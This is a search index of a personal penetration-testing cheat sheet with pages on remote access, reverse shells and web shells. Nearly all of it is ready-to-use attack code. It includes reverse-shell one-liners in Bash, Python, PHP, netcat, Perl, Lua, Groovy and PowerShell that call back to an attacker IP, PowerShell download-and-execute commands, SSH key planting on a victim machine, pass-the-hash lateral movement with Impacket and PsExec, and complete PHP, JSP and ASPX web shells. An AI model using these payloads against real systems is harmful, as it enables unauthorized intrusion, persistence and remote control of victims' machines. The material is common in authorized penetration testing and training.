{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Hacking Notes Simple notes taken to avoid having to look for information every time. Most of these snippets or techniques are not mine, just taken from other sites to keep my mind organized. General Links Back to Blog Cyberchef ExplainShell","title":"Home"},{"location":"#hacking-notes","text":"Simple notes taken to avoid having to look for information every time. Most of these snippets or techniques are not mine, just taken from other sites to keep my mind organized.","title":"Hacking Notes"},{"location":"#general-links","text":"Back to Blog Cyberchef ExplainShell","title":"General Links"},{"location":"shells/remote/","text":"Remote access Reverse shells are useful when you does not have credentials or you just exploited a service. Here are listed more methods to access remotely a machine. Linux SSH + Dropping a key If you compromise a user and is a ssh capable user (check for a login shell in /etc/passwd), it is possible to get his ssh key in ~/.ssh/id_rsa if its located in the typical location. If there is no key, it is always possible to drop one with two simple commands: #Create the key ssh-keygen -f ./key #Accept all prompts cat ./key.pub #Copy the public key # In the victim machine echo 'ssh-rsa ...........' > ~/.ssh/authorized_keys # In your machine again chmod 600 key ssh -i key user@machine Windows Below is a table used as a cheatsheet for different ways to connect remotely depending on open ports: RDP Port: 3389 Tools Microsoft RDP Client ( mstsc.exe ) mstsc.exe /v:hostname:port /admin XFreeRDP: xfreerdp /u:user /d:domain /pth:<NTLM> /v:10.0.0.2 RDesktop: rdesktop -g 90% 10.0.0.1 SMB Quote SMB has been leveraged for file administration on Windows and *nix systems for decades. Another feature often abused by attackers is the use of administrative shares (C$, ADMIN$, IPC$) to push a service binary to a target machine, then start the service for semi-interactive I/O. SysInternalsSuite includes the PsExec binary which is largely credited for developing and leveraging this technique. Local administrative privileges are required to push the service binary to the ADMIN$ share, after which an RPC/SVCCTL call creates and starts the remote control service. IPC$ is leveraged to create named pipes for input and output which act as a semi-interactive shell. Credit: https://dolosgroup.io/blog/remote-access-cheat-sheet Port: 445 Tools PsExec.exe \\\\10.0.0.1 -u user -p pass cmd.exe psexec.py 'user':'pass'@10.0.0.1 cmd.exe smbexec.py 'user':'pass'@10.0.0.1 cmd.exe winexe --system --uninstall -U domain/user%pass //10.0.0.1 cmd.exe Info If Credentials with administrative privileges are provided, it is possible to spawn a shell with NT Authority\\System user passing the -s flag to PsExec.exe Also if you are doing this in an interactive command prompt, you could also pass the -i flag to interact with the created process. WinRM Port: 5985/TCP (HTTP), 5986/TCP (HTTPS) Tools evil-winrm Normal login evil-winrm -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' Cert Login evil-winrm -i 10.0.0.1 -c user.crt -k user.key Info It is needed to use -S flag if you are connecting to a HTTPS Endpoint From Windows Machine New-PSSession -Computer IP -Authentication Negotiate -Credential USER | Enter-PSSession In the section changing user context a method to create a Credential object is explained. WMI Port: 135/TCP (RPC), High TCP (DCOM) Tools Impacket-wmiexec Normal wmiexec.py domain/user:pass@target_ip Pass the hash wmiexec.py user@target_ip -hashes LM:NT wmic.exe wmic.exe /USER:\"domain\\user\" /PASSWORD:\"Password\" /NODE:10.0.0.1 service get \"startname,pathname\" Scheduled Tasks Port: 135/TCP (RPC), High TCP (DCOM) Tools: atexec (Impacket) atexec.py user@target_ip -hashes LM:NT Changing user context for cmd In a cmd interactive session runas runas /netonly /user:domain\\user \"powershell.exe\" psexec PsExec.exe -u user -p pass -i cmd.exe From Powershell Invoke-Command $pass = ConvertTo-SecureString 'password' -AsPlainText -Force $cred = New-Object System . Management . Automation . PSCredential ( 'user' , $pass ) Invoke-Command -Computer COMPUTER -Credential $cred -ScriptBlock { command } #Example command: iex (New-Object Net.WebClient).DownloadString('bla/rev.ps1') Note If you are having problems with \"powershell double jump\" you can pass the -Authentication CredSSP to fix it. Adding kerberos config in linux Edit the /etc/krb5.conf adding the following (adapt): [realms] DOMAIN.LOCAL = { kdc = 10.0.0.1 } Get a ticket kinit user klist","title":"Remote Access"},{"location":"shells/remote/#remote-access","text":"Reverse shells are useful when you does not have credentials or you just exploited a service. Here are listed more methods to access remotely a machine.","title":"Remote access"},{"location":"shells/remote/#linux","text":"","title":"Linux"},{"location":"shells/remote/#ssh-dropping-a-key","text":"If you compromise a user and is a ssh capable user (check for a login shell in /etc/passwd), it is possible to get his ssh key in ~/.ssh/id_rsa if its located in the typical location. If there is no key, it is always possible to drop one with two simple commands: #Create the key ssh-keygen -f ./key #Accept all prompts cat ./key.pub #Copy the public key # In the victim machine echo 'ssh-rsa ...........' > ~/.ssh/authorized_keys # In your machine again chmod 600 key ssh -i key user@machine","title":"SSH + Dropping a key"},{"location":"shells/remote/#windows","text":"Below is a table used as a cheatsheet for different ways to connect remotely depending on open ports:","title":"Windows"},{"location":"shells/remote/#rdp","text":"Port: 3389 Tools Microsoft RDP Client ( mstsc.exe ) mstsc.exe /v:hostname:port /admin XFreeRDP: xfreerdp /u:user /d:domain /pth:<NTLM> /v:10.0.0.2 RDesktop: rdesktop -g 90% 10.0.0.1","title":"RDP"},{"location":"shells/remote/#smb","text":"Quote SMB has been leveraged for file administration on Windows and *nix systems for decades. Another feature often abused by attackers is the use of administrative shares (C$, ADMIN$, IPC$) to push a service binary to a target machine, then start the service for semi-interactive I/O. SysInternalsSuite includes the PsExec binary which is largely credited for developing and leveraging this technique. Local administrative privileges are required to push the service binary to the ADMIN$ share, after which an RPC/SVCCTL call creates and starts the remote control service. IPC$ is leveraged to create named pipes for input and output which act as a semi-interactive shell. Credit: https://dolosgroup.io/blog/remote-access-cheat-sheet Port: 445 Tools PsExec.exe \\\\10.0.0.1 -u user -p pass cmd.exe psexec.py 'user':'pass'@10.0.0.1 cmd.exe smbexec.py 'user':'pass'@10.0.0.1 cmd.exe winexe --system --uninstall -U domain/user%pass //10.0.0.1 cmd.exe Info If Credentials with administrative privileges are provided, it is possible to spawn a shell with NT Authority\\System user passing the -s flag to PsExec.exe Also if you are doing this in an interactive command prompt, you could also pass the -i flag to interact with the created process.","title":"SMB"},{"location":"shells/remote/#winrm","text":"Port: 5985/TCP (HTTP), 5986/TCP (HTTPS) Tools evil-winrm Normal login evil-winrm -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' Cert Login evil-winrm -i 10.0.0.1 -c user.crt -k user.key Info It is needed to use -S flag if you are connecting to a HTTPS Endpoint From Windows Machine New-PSSession -Computer IP -Authentication Negotiate -Credential USER | Enter-PSSession In the section changing user context a method to create a Credential object is explained.","title":"WinRM"},{"location":"shells/remote/#wmi","text":"Port: 135/TCP (RPC), High TCP (DCOM) Tools Impacket-wmiexec Normal wmiexec.py domain/user:pass@target_ip Pass the hash wmiexec.py user@target_ip -hashes LM:NT wmic.exe wmic.exe /USER:\"domain\\user\" /PASSWORD:\"Password\" /NODE:10.0.0.1 service get \"startname,pathname\"","title":"WMI"},{"location":"shells/remote/#scheduled-tasks","text":"Port: 135/TCP (RPC), High TCP (DCOM) Tools: atexec (Impacket) atexec.py user@target_ip -hashes LM:NT","title":"Scheduled Tasks"},{"location":"shells/remote/#changing-user-context-for-cmd","text":"In a cmd interactive session runas runas /netonly /user:domain\\user \"powershell.exe\" psexec PsExec.exe -u user -p pass -i cmd.exe From Powershell Invoke-Command $pass = ConvertTo-SecureString 'password' -AsPlainText -Force $cred = New-Object System . Management . Automation . PSCredential ( 'user' , $pass ) Invoke-Command -Computer COMPUTER -Credential $cred -ScriptBlock { command } #Example command: iex (New-Object Net.WebClient).DownloadString('bla/rev.ps1') Note If you are having problems with \"powershell double jump\" you can pass the -Authentication CredSSP to fix it.","title":"Changing user context for cmd"},{"location":"shells/remote/#adding-kerberos-config-in-linux","text":"Edit the /etc/krb5.conf adding the following (adapt): [realms] DOMAIN.LOCAL = { kdc = 10.0.0.1 } Get a ticket kinit user klist","title":"Adding kerberos config in linux"},{"location":"shells/reverse/","text":"Reverse shells Compendium of reverse shells. Linux and OS agnostic reverse shells Bash bash -i > & /dev/tcp/10.0.0.1/8080 0 > & 1 Info Sometimes is not possible to put spaces in the payload. ${IFS} can be used as a separator on linux systems. Python import socket , subprocess , os ; s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \"10.0.0.1\" , 1234 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); p = subprocess . call ([ \"/bin/sh\" , \"-i\" ]); This will be executed if you are injecting this code into a python execution context. In case we need to do it from a shell, you can prepend python -c 'payload' Warning It is possible that if you are executing this into a shell (eg. Bash) can assume that python is not installed if the execution fails. Try python3 for example, it could be only installed under this name. Alternative Method: import socket , subprocess , os ; s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \"10.0.0.1\" , 4242 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); import pty ; pty . spawn ( \"/bin/bash\" ) PHP $sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\"); Or prepending php -r 'payload' if we executing this from a shell context. Netcat nc -e /bin/sh 10 .0.0.1 1234 Info This will only work on systems that have the \"insecure\" version of netcat installed. The -e functionality its usually disabled. Sometimes can be found in nc.traditional program if it is installed. In case Netcat is installed but without the -e flag, you can do the following (FIFO pipes shell) rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2 > & 1 | nc 10 .0.0.1 4242 >/tmp/f Socat Attacker: socat file: ` tty ` ,raw,echo = 0 TCP-L:4242 Victim: /tmp/socat exec: 'bash -li' ,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242 Lua local host , port = \"10.0.0.1\" , 4242 local socket = require ( \"socket\" ) local tcp = socket . tcp () local io = require ( \"io\" ) tcp : connect ( host , port ); while true do local cmd , status , partial = tcp : receive () local f = io.popen ( cmd , \"r\" ) local s = f : read ( \"*a\" ) f : close () tcp : send ( s ) if status == \"closed\" then break end end tcp : close () Node JS require ( 'child_process' ). exec ( 'nc -e /bin/sh 10.0.0.1 4242' ) Perl perl - e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' Groovy String host = \"localhost\" ; int port = 8044 ; String cmd = \"cmd.exe\" ; Process p = new ProcessBuilder ( cmd ). redirectErrorStream ( true ). start (); Socket s = new Socket ( host , port ); InputStream pi = p . getInputStream (), pe = p . getErrorStream (), si = s . getInputStream (); OutputStream po = p . getOutputStream (), so = s . getOutputStream (); while (! s . isClosed ()){ while ( pi . available ()> 0 ) so . write ( pi . read ()); while ( pe . available ()> 0 ) so . write ( pe . read ()); while ( si . available ()> 0 ) po . write ( si . read ()); so . flush (); po . flush (); Thread . sleep ( 50 ); try { p . exitValue (); break ;} catch ( Exception e ){}}; p . destroy (); s . close (); Hint Useful when exploiting Jenkins. If your Jenkins privileges let you to access groovy console (Tipically found at /script on jenkins GUI) it is possible to use this reverse shell to get RCE. Windows reverse shells Windows by default could use any of the above shells if there is present any of the languages. If not, a typical approach is going with Powershell. Nishang Nishang Github Quote Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing. In memory execution: iex ( New-Object Net . WebClient ). DownloadString ( 'http://<yourwebserver>/Invoke-PowerShellTcp.ps1' ); Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] You can also add in the file the last line Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] to the script and do the same function in one command. Powershell One-Liner: $client = New-Object System . Net . Sockets . TCPClient ( '10.0.0.1' , 4444 ); $stream = $client . GetStream (); [byte[]] $bytes = 0 .. 65535 |%{ 0 }; while (( $i = $stream . Read ( $bytes , 0 , $bytes . Length )) -ne 0 ){; $data = ( New-Object -TypeName System . Text . ASCIIEncoding ). GetString ( $bytes , 0 , $i ); $sendback = ( iex $data 2 >& 1 | Out-String ); $sendback2 = $sendback + 'PS ' + ( pwd ). Path + '> ' ; $sendbyte = ( [text.encoding] :: ASCII ). GetBytes ( $sendback2 ); $stream . Write ( $sendbyte , 0 , $sendbyte . Length ); $stream . Flush ()}; $client . Close () ConPty Github IEX ( IWR https : // raw . githubusercontent . com / antonioCoco / ConPtyShell / master / Invoke-ConPtyShell . ps1 ); Invoke-ConPtyShell 10 . 0 . 0 . 2 3001 Note Fully interactive shell, but needs Rows and Cols. As noted on the repo, it is possible to avoid setting these params if the listener is started like this: stty raw -echo; (stty size; cat) | nc -lvnp 3001 Warning Requirements: Client Side: Windows version >= 10 / 2019 1809 (build >= 10.0.17763) General tricks and upgrading the shell When catching reverse shells with netcat on a port (e.g. using nc -lvnp 4444 ) you can find a lot of times that is hard to edit commands if you make a typo or whatever. This is due to losing access to some \"terminal enhancers\" we have on default shell session in our machine. One of them is ReadLine that allow you to edit your commands or use your arrow keys to rotate between them. It is possible to replicate that functionality into the reverse shell prepending the listening shell with rlwrap . Example: rlwrap nc -lvnp 1234 Another improvement for the shell could be putting the \"host\" shell on raw mode to use keyboard shortcuts or editor programs on your reverse shell. That can be achieved doing the following: ctrl+z echo $TERM && tput lines && tput cols # for bash stty raw -echo fg # for zsh stty raw -echo ; fg reset export SHELL = bash export TERM = xterm-256color stty rows <num> columns <cols> Note the detail on zsh. The motivation behind doing the trick different resides on this information taken from PayloadsAllTheThings repo: Quote The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect References Pentest Monkey PayloadsAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md Groovy Shell https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76","title":"Reverse Shells"},{"location":"shells/reverse/#reverse-shells","text":"Compendium of reverse shells.","title":"Reverse shells"},{"location":"shells/reverse/#linux-and-os-agnostic-reverse-shells","text":"","title":"Linux and OS agnostic reverse shells"},{"location":"shells/reverse/#bash","text":"bash -i > & /dev/tcp/10.0.0.1/8080 0 > & 1 Info Sometimes is not possible to put spaces in the payload. ${IFS} can be used as a separator on linux systems.","title":"Bash"},{"location":"shells/reverse/#python","text":"import socket , subprocess , os ; s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \"10.0.0.1\" , 1234 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); p = subprocess . call ([ \"/bin/sh\" , \"-i\" ]); This will be executed if you are injecting this code into a python execution context. In case we need to do it from a shell, you can prepend python -c 'payload' Warning It is possible that if you are executing this into a shell (eg. Bash) can assume that python is not installed if the execution fails. Try python3 for example, it could be only installed under this name. Alternative Method: import socket , subprocess , os ; s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \"10.0.0.1\" , 4242 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); import pty ; pty . spawn ( \"/bin/bash\" )","title":"Python"},{"location":"shells/reverse/#php","text":"$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\"); Or prepending php -r 'payload' if we executing this from a shell context.","title":"PHP"},{"location":"shells/reverse/#netcat","text":"nc -e /bin/sh 10 .0.0.1 1234 Info This will only work on systems that have the \"insecure\" version of netcat installed. The -e functionality its usually disabled. Sometimes can be found in nc.traditional program if it is installed. In case Netcat is installed but without the -e flag, you can do the following (FIFO pipes shell) rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2 > & 1 | nc 10 .0.0.1 4242 >/tmp/f","title":"Netcat"},{"location":"shells/reverse/#socat","text":"Attacker: socat file: ` tty ` ,raw,echo = 0 TCP-L:4242 Victim: /tmp/socat exec: 'bash -li' ,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242","title":"Socat"},{"location":"shells/reverse/#lua","text":"local host , port = \"10.0.0.1\" , 4242 local socket = require ( \"socket\" ) local tcp = socket . tcp () local io = require ( \"io\" ) tcp : connect ( host , port ); while true do local cmd , status , partial = tcp : receive () local f = io.popen ( cmd , \"r\" ) local s = f : read ( \"*a\" ) f : close () tcp : send ( s ) if status == \"closed\" then break end end tcp : close ()","title":"Lua"},{"location":"shells/reverse/#node-js","text":"require ( 'child_process' ). exec ( 'nc -e /bin/sh 10.0.0.1 4242' )","title":"Node JS"},{"location":"shells/reverse/#perl","text":"perl - e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'","title":"Perl"},{"location":"shells/reverse/#groovy","text":"String host = \"localhost\" ; int port = 8044 ; String cmd = \"cmd.exe\" ; Process p = new ProcessBuilder ( cmd ). redirectErrorStream ( true ). start (); Socket s = new Socket ( host , port ); InputStream pi = p . getInputStream (), pe = p . getErrorStream (), si = s . getInputStream (); OutputStream po = p . getOutputStream (), so = s . getOutputStream (); while (! s . isClosed ()){ while ( pi . available ()> 0 ) so . write ( pi . read ()); while ( pe . available ()> 0 ) so . write ( pe . read ()); while ( si . available ()> 0 ) po . write ( si . read ()); so . flush (); po . flush (); Thread . sleep ( 50 ); try { p . exitValue (); break ;} catch ( Exception e ){}}; p . destroy (); s . close (); Hint Useful when exploiting Jenkins. If your Jenkins privileges let you to access groovy console (Tipically found at /script on jenkins GUI) it is possible to use this reverse shell to get RCE.","title":"Groovy"},{"location":"shells/reverse/#windows-reverse-shells","text":"Windows by default could use any of the above shells if there is present any of the languages. If not, a typical approach is going with Powershell.","title":"Windows reverse shells"},{"location":"shells/reverse/#nishang","text":"Nishang Github Quote Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing. In memory execution: iex ( New-Object Net . WebClient ). DownloadString ( 'http://<yourwebserver>/Invoke-PowerShellTcp.ps1' ); Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] You can also add in the file the last line Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] to the script and do the same function in one command. Powershell One-Liner: $client = New-Object System . Net . Sockets . TCPClient ( '10.0.0.1' , 4444 ); $stream = $client . GetStream (); [byte[]] $bytes = 0 .. 65535 |%{ 0 }; while (( $i = $stream . Read ( $bytes , 0 , $bytes . Length )) -ne 0 ){; $data = ( New-Object -TypeName System . Text . ASCIIEncoding ). GetString ( $bytes , 0 , $i ); $sendback = ( iex $data 2 >& 1 | Out-String ); $sendback2 = $sendback + 'PS ' + ( pwd ). Path + '> ' ; $sendbyte = ( [text.encoding] :: ASCII ). GetBytes ( $sendback2 ); $stream . Write ( $sendbyte , 0 , $sendbyte . Length ); $stream . Flush ()}; $client . Close ()","title":"Nishang"},{"location":"shells/reverse/#conpty","text":"Github IEX ( IWR https : // raw . githubusercontent . com / antonioCoco / ConPtyShell / master / Invoke-ConPtyShell . ps1 ); Invoke-ConPtyShell 10 . 0 . 0 . 2 3001 Note Fully interactive shell, but needs Rows and Cols. As noted on the repo, it is possible to avoid setting these params if the listener is started like this: stty raw -echo; (stty size; cat) | nc -lvnp 3001 Warning Requirements: Client Side: Windows version >= 10 / 2019 1809 (build >= 10.0.17763)","title":"ConPty"},{"location":"shells/reverse/#general-tricks-and-upgrading-the-shell","text":"When catching reverse shells with netcat on a port (e.g. using nc -lvnp 4444 ) you can find a lot of times that is hard to edit commands if you make a typo or whatever. This is due to losing access to some \"terminal enhancers\" we have on default shell session in our machine. One of them is ReadLine that allow you to edit your commands or use your arrow keys to rotate between them. It is possible to replicate that functionality into the reverse shell prepending the listening shell with rlwrap . Example: rlwrap nc -lvnp 1234 Another improvement for the shell could be putting the \"host\" shell on raw mode to use keyboard shortcuts or editor programs on your reverse shell. That can be achieved doing the following: ctrl+z echo $TERM && tput lines && tput cols # for bash stty raw -echo fg # for zsh stty raw -echo ; fg reset export SHELL = bash export TERM = xterm-256color stty rows <num> columns <cols> Note the detail on zsh. The motivation behind doing the trick different resides on this information taken from PayloadsAllTheThings repo: Quote The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect","title":"General tricks and upgrading the shell"},{"location":"shells/reverse/#references","text":"Pentest Monkey PayloadsAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md Groovy Shell https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76","title":"References"},{"location":"shells/webshells/","text":"WebShells When you exploit a web service or you have a file upload with file execution. PHP Simple PHP webshell code <?php system ( $_REQUEST [ 'variable' ]); ?> Info What the $_REQUEST does is accept the parameter from GET or POST request. It can be adapted to POST or GET if it is needed specifically for the exploit. JSP Simple JSP webshell code <%@ page import = \"java.util.*,java.io.*\" %> <HTML><BODY> <FORM METHOD= \"GET\" NAME= \"form1\" ACTION= \"\" > <INPUT TYPE= \"text\" NAME= \"variable\" > <INPUT TYPE= \"submit\" VALUE= \"Send\" > </FORM> <pre> <% if ( request . getParameter ( \"variable\" ) != null ) { Process prc = Runtime . getRuntime (). exec ( request . getParameter ( \"variable\" )); InputStream ins = prc . getInputStream (); OutputStream oss = prc . getOutputStream (); DataInputStream datastr = new DataInputStream ( ins ); String str = datastr . readLine (); out . println ( \"Input: \" + request . getParameter ( \"variable\" ) + \"<BR>\" ); while ( str != null ) { out . println ( str ); str = datastr . readLine (); } } %> </pre> </BODY></HTML> ASPX Simple ASPX webshell code <% @ Page Language = \"C#\" Debug = \"true\" Trace = \"false\" %> <% @ Import Namespace = \"System.Diagnostics\" %> <% @ Import Namespace = \"System.IO\" %> < script Language = \"c#\" runat = \"server\" > void Page_Load ( object sender , EventArgs e ) { } string ExAttr ( string params ) { ProcessStartInfo procstarti = new ProcessStartInfo (); procstarti . FileName = \"cmd\" + \".exe\" ; procstarti . Arguments = \"/c \" + params ; procstarti . RedirectStandardOutput = true ; procstarti . UseShellExecute = false ; Process proc = Process . Start ( procstarti ); StreamReader strrdr = proc . StandardOutput ; string str = strrdr . ReadToEnd (); strrdr . Close (); return str ; } void Args_Click ( object sender , System . EventArgs e ) { Response . Write ( \"<pre>\" ); Response . Write ( Server . HtmlEncode ( ExAttr ( text . Text ))); Response . Write ( \"</pre>\" ); } </ script > < HTML > < HEAD > < title > My Little Pony </ title > </ HEAD > < body > < form id = \"cmd\" method = \"post\" runat = \"server\" > < asp : TextBox id = \"text\" style = \"Z-INDEX: 110; LEFT: 400px; POSITION: absolute; TOP: 20px\" runat = \"server\" Width = \"250px\" ></ asp : TextBox > < asp : Button id = \"but\" style = \"Z-INDEX: 112; LEFT: 675px; POSITION: absolute; TOP: 18px\" runat = \"server\" Text = \"excute\" OnClick = \"Args_Click\" ></ asp : Button > < asp : Label id = \"labtext\" style = \"Z-INDEX: 114; LEFT: 310px; POSITION: absolute; TOP: 22px\" runat = \"server\" > Args :</ asp : Label > </ form > </ body > </ HTML >","title":"Web Shells"},{"location":"shells/webshells/#webshells","text":"When you exploit a web service or you have a file upload with file execution.","title":"WebShells"},{"location":"shells/webshells/#php","text":"Simple PHP webshell code <?php system ( $_REQUEST [ 'variable' ]); ?> Info What the $_REQUEST does is accept the parameter from GET or POST request. It can be adapted to POST or GET if it is needed specifically for the exploit.","title":"PHP"},{"location":"shells/webshells/#jsp","text":"Simple JSP webshell code <%@ page import = \"java.util.*,java.io.*\" %> <HTML><BODY> <FORM METHOD= \"GET\" NAME= \"form1\" ACTION= \"\" > <INPUT TYPE= \"text\" NAME= \"variable\" > <INPUT TYPE= \"submit\" VALUE= \"Send\" > </FORM> <pre> <% if ( request . getParameter ( \"variable\" ) != null ) { Process prc = Runtime . getRuntime (). exec ( request . getParameter ( \"variable\" )); InputStream ins = prc . getInputStream (); OutputStream oss = prc . getOutputStream (); DataInputStream datastr = new DataInputStream ( ins ); String str = datastr . readLine (); out . println ( \"Input: \" + request . getParameter ( \"variable\" ) + \"<BR>\" ); while ( str != null ) { out . println ( str ); str = datastr . readLine (); } } %> </pre> </BODY></HTML>","title":"JSP"},{"location":"shells/webshells/#aspx","text":"Simple ASPX webshell code <% @ Page Language = \"C#\" Debug = \"true\" Trace = \"false\" %> <% @ Import Namespace = \"System.Diagnostics\" %> <% @ Import Namespace = \"System.IO\" %> < script Language = \"c#\" runat = \"server\" > void Page_Load ( object sender , EventArgs e ) { } string ExAttr ( string params ) { ProcessStartInfo procstarti = new ProcessStartInfo (); procstarti . FileName = \"cmd\" + \".exe\" ; procstarti . Arguments = \"/c \" + params ; procstarti . RedirectStandardOutput = true ; procstarti . UseShellExecute = false ; Process proc = Process . Start ( procstarti ); StreamReader strrdr = proc . StandardOutput ; string str = strrdr . ReadToEnd (); strrdr . Close (); return str ; } void Args_Click ( object sender , System . EventArgs e ) { Response . Write ( \"<pre>\" ); Response . Write ( Server . HtmlEncode ( ExAttr ( text . Text ))); Response . Write ( \"</pre>\" ); } </ script > < HTML > < HEAD > < title > My Little Pony </ title > </ HEAD > < body > < form id = \"cmd\" method = \"post\" runat = \"server\" > < asp : TextBox id = \"text\" style = \"Z-INDEX: 110; LEFT: 400px; POSITION: absolute; TOP: 20px\" runat = \"server\" Width = \"250px\" ></ asp : TextBox > < asp : Button id = \"but\" style = \"Z-INDEX: 112; LEFT: 675px; POSITION: absolute; TOP: 18px\" runat = \"server\" Text = \"excute\" OnClick = \"Args_Click\" ></ asp : Button > < asp : Label id = \"labtext\" style = \"Z-INDEX: 114; LEFT: 310px; POSITION: absolute; TOP: 22px\" runat = \"server\" > Args :</ asp : Label > </ form > </ body > </ HTML >","title":"ASPX"}]}